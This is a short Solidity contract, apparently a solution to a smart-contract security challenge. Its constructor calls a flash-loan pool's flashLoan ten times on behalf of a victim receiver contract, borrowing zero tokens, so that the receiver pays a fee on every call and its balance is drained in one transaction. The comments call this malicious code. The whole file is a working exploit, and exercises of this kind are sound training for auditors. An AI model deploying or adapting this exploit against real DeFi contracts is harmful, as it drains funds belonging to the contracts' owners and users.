// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { FlashLoanReceiver } from "./FlashLoanReceiver.sol";
import { NaiveReceiverLenderPool } from "./NaiveReceiverLenderPool.sol";
import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract Attacker {
    constructor(address payable _pool, address payable _receiver){
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        for (uint256 i = 0; i < 10; i++) {
            // we can just pass 0 tokens to loan lol. We just want to trigger the flashloan.
            // By deploying an attacker contract, all the code in the constructor runs once.
            // This malcious code in the constructor will loop until it's done, and then spit out one big transaction.
            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 0, "");
        }
    }
}